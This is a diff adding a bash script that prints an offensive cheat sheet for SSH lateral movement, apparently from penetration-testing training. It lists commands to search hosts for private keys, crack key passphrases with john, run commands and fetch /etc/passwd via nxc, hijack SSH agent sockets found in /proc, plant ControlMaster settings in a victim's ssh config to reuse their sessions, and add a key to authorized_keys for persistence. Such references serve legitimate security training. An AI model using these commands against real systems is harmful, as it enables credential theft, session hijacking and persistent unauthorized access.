@@ -1,0 +1,59 @@
+#!/bin/bash
+BOLD='\033[1m'
+CYAN='\033[36m'
+GREEN='\033[32m'
+YELLOW='\033[33m'
+BLUE='\033[34m'
+NC='\033[0m'
+
+printf "\n"
+echo -e "${BOLD}${YELLOW}── SSH — LATERAL MOVEMENT & HIJACKING ───────────────${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Enumerate SSH Keys ───────────────────────────────${NC}"
+echo -e "  ${GREEN}find / -name 'id_rsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' 2>/dev/null${NC}"
+echo -e "  ${GREEN}find / -name 'authorized_keys' 2>/dev/null${NC}"
+echo -e "  ${GREEN}find / -name '*.pem' -o -name '*.ppk' 2>/dev/null${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Crack SSH Key ────────────────────────────────────${NC}"
+echo -e "  ${GREEN}ssh2john id_rsa > id_rsa.hash${NC}"
+echo -e "  ${GREEN}john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Use SSH Key ──────────────────────────────────────${NC}"
+echo -e "  ${GREEN}chmod 600 id_rsa${NC}"
+echo -e "  ${GREEN}ssh -i id_rsa <USER>@<TARGET>${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── nxc SSH ──────────────────────────────────────────${NC}"
+echo -e "  ${GREEN}nxc ssh <TARGET> -u <USER> -p <PASS>${NC}"
+echo -e "  ${GREEN}nxc ssh <TARGET> -u <USER> -p <PASS> -x 'id'${NC}"
+echo -e "  ${GREEN}nxc ssh <TARGET> -u <USER> -p <PASS> --get-file /etc/passwd /tmp/passwd${NC}"
+echo -e "  ${GREEN}nxc ssh <TARGET> -u <USER> -p <PASS> --put-file /local/file /remote/path${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── SSH Agent Hijacking ───────────────────────────────${NC}"
+echo -e "  Note: Find SSH_AUTH_SOCK in /proc"
+echo -e "  ${GREEN}for pid in \$(ls /proc | grep -E '^[0-9]+\$'); do cat /proc/\$pid/environ 2>/dev/null | tr '\\0' '\\n' | grep SSH_AUTH_SOCK; done${NC}"
+echo -e "  ${GREEN}export SSH_AUTH_SOCK=/tmp/ssh-XXXXXX/agent.XXXXXX${NC}"
+echo -e "  ${GREEN}ssh <USER>@<TARGET>${NC}                                # hijacked session"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── ControlMaster Hijacking ──────────────────────────${NC}"
+echo -e "  Note: Add to victim ~/.ssh/config"
+echo -e "  ${GREEN}Host *${NC}"
+echo -e "  ${GREEN}  ControlMaster auto${NC}"
+echo -e "  ${GREEN}  ControlPath /home/offsec/.ssh/controlmaster/%r@%h:%p${NC}"
+echo -e "  ${GREEN}  ControlPersist yes${NC}"
+echo -e "  Note: After victim authenticates"
+echo -e "  ${GREEN}ssh -S /home/offsec/.ssh/controlmaster/offsec@<TARGET>:22 offsec@<TARGET>${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Persistence via SSH ──────────────────────────────${NC}"
+echo -e "  ${GREEN}cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys${NC}    # add our key"
+echo -e "  ${GREEN}chmod 600 ~/.ssh/authorized_keys${NC}"
+printf "\n"
+
+printf "\n"
+echo -e "${YELLOW}─────────────────────────────────────────────────────${NC}"
